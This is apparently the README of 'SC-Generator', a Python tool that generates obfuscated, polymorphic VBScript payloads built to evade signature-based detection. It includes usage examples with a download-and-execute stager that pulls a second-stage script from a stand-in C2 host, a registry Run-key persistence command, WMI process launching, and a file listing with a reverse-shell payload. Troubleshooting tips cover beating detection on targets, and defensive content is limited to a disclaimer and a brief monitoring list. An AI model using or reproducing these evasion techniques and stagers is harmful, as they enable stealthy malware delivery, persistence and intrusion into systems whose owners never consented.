# SC-Generator: Security Research VBS Payload Framework

**For authorized pentesting, security research, and authorized testing of your own infrastructure only.**

A comprehensive framework for generating clean, undetectable VBS (VBScript) payloads for authorized security testing and research purposes.

## Overview

This project provides multiple encoding and obfuscation techniques to generate VBS payloads that:
- Avoid signature-based detection
- Use legitimate Windows objects and APIs
- Maintain polymorphic characteristics (changes structure each execution)
- Support multiple encoding schemes
- Hide payloads across various Windows subsystems

## Features

### Core Modules

1. **vbs_encoder.py** - Base encoding and obfuscation
   - Base64 encoding with MSXML decoder
   - Hex encoding with Chr() decoder
   - Array concatenation encoding
   - WScript hidden execution
   - Polymorphic wrapper generation

2. **vbs_advanced_obfuscation.py** - Advanced stealth techniques
   - WMI-based execution
   - Registry-stored payloads
   - Environment variable obfuscation
   - COM object variation
   - File writer injection
   - Multi-encoding chains
   - Obfuscated function calls

3. **payload_generator.py** - Unified CLI interface
   - Simple command-line interface
   - Multiple technique selection
   - Output to file or stdout
   - Technique documentation

## Available Obfuscation Techniques

| Technique | Detection Resistance | Use Case |
|-----------|----------------------|----------|
| basic | Low | Quick testing |
| base64 | Medium | Standard obfuscation |
| hex | Medium-High | Good evasion |
| array | Medium-High | Chunk-based encoding |
| wmi | Medium-High | WMI-based execution |
| registry | High | Registry-stored payload |
| env | High | Environment variable hiding |
| com | Medium-High | COM object variation |
| obfuscated_calls | High | String-built function names |
| filewriter | Medium | Temp file execution |
| multi_encoding | Very High | Multiple encoding layers |
| hidden_execution | Very High | Polymorphic wrapper |

## Installation

```bash
# No external dependencies required
# Uses only Python standard library
python3 payload_generator.py --help
```

## Usage

### List Available Techniques

```bash
python3 payload_generator.py --list-techniques
```

### Generate Basic Payload

```bash
python3 payload_generator.py -c "powershell.exe -Command 'Write-Host test'" --technique base64
```

### Generate with Advanced Technique

```bash
python3 payload_generator.py -c "cmd /c echo test" --technique wmi --obfuscation high
```

### Save to File

```bash
python3 payload_generator.py -c "your-command-here" --technique multi_encoding -f payload.vbs
```

### Get Technique Information

```bash
python3 payload_generator.py --technique-info wmi
```

## Programmatic Usage

```python
from payload_generator import PayloadGenerator

gen = PayloadGenerator()

# Generate base64-encoded payload
payload = gen.generate("powershell.exe -Command 'Write-Host test'", 
                       technique="base64", 
                       obfuscation_level="high")

print(payload)
```

### Direct Module Usage

```python
from vbs_encoder import VBSEncoder, generate_clean_vbs_payload
from vbs_advanced_obfuscation import create_stealthy_payload

# Using encoder directly
encoder = VBSEncoder()
payload = encoder.create_full_obfuscated_payload("cmd /c echo test", "base64")

# Using advanced techniques
stealthy = create_stealthy_payload("powershell.exe test", technique="wmi")
```

## Payload Characteristics

### Generated VBS Features

- **Legitimate Looking**: Uses standard Windows objects and functions
- **No External Dependencies**: Uses built-in COM objects
- **Error Suppression**: On Error Resume Next for reliability
- **Hidden Execution**: 0 window style for invisible operation
- **Variable Obfuscation**: Random variable and function names
- **Polymorphic**: Changes structure on each generation
- **Clean Strings**: Multiple encoding schemes avoid static analysis

### Windows Objects Used

- `WScript.Shell` - Command execution
- `WScript.Network` - Network operations
- `MSXML2.DOMDocument` - Base64 decoding
- `Scripting.FileSystemObject` - File operations
- `Win32_Process` - WMI process creation
- `Shell.Application` - Application shell

## Security Considerations for Testers

### Legal Use

- ✅ Authorized penetration testing engagements
- ✅ Testing your own infrastructure
- ✅ Security research on systems you own/control
- ✅ CTF challenges and authorized competitions
- ❌ Unauthorized access to systems
- ❌ Malware distribution
- ❌ Mass deployment without authorization

### Detection & Response

These payloads are designed for authorized security testing. In a real security situation:
- Monitor for unusual VBScript execution
- Alert on WMI process creation (Win32_Process)
- Watch registry writes to sensitive paths
- Monitor environment variable creation by scripts
- Track file creation in temp directories

## Advanced Examples

### Multi-Stage Payload

```python
# Stage 1: Download payload
cmd = "powershell -Command \"(New-Object Net.WebClient).DownloadFile('http://c2.test/stage2.ps1','$env:temp\\\\s2.ps1'); & $env:temp\\\\s2.ps1\""

gen = PayloadGenerator()
payload = gen.generate(cmd, technique="multi_encoding")
```

### Registry-Based Persistence

```python
cmd = "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d \"powershell -Command test\""

payload = gen.generate(cmd, technique="registry")
```

### WMI Execution

```python
cmd = "C:\\Windows\\System32\\cmd.exe /c powershell.exe -NoProfile -Command Write-Host test"

payload = gen.generate(cmd, technique="wmi")
```

## File Structure

```
sc-generator/
├── vbs_encoder.py                 # Base encoding/obfuscation
├── vbs_advanced_obfuscation.py   # Advanced stealth techniques
├── payload_generator.py           # CLI interface
├── examples/
│   ├── basic_execution.vbs       # Simple execution example
│   ├── reverse_shell.vbs         # Reverse shell payload
│   └── persistence.vbs           # Persistence mechanism
└── README.md                       # This file
```

## Performance Notes

- **Generation**: < 100ms per payload
- **Execution**: Minimal overhead, native VBScript
- **Size**: Varies by technique (typically 0.5-2 KB)
- **Compatibility**: Windows XP SP3+ (with WScript)

## Troubleshooting

### Payload won't execute

1. Ensure execution policy allows VBScript (usually enabled by default)
2. Test with simpler commands first
3. Verify command syntax outside of VBS encoding
4. Check for special characters that need escaping

### Detection issues

- Try different techniques
- Use `multi_encoding` for maximum obfuscation
- Combine with other evasion methods
- Test in target environment

### Python errors

- Ensure Python 3.6+ installed
- Check file permissions
- Verify working directory

## Contributing

This is a security research tool. Contributions should:
- Maintain authorization and legal compliance
- Focus on detection evasion for authorized testing
- Include documentation for new techniques
- Add examples for new features

## Disclaimer

This tool is provided for authorized security testing, pentesting, and research only. Users are responsible for:
- Obtaining proper authorization before testing
- Following applicable laws and regulations
- Using the tool ethically and legally
- Not using it for malicious purposes

Unauthorized access to computer systems is illegal.

## License

For internal use in authorized security testing scenarios only.

---

**Last Updated**: 2026-06-29
**Version**: 1.0.0
**Status**: Active Development
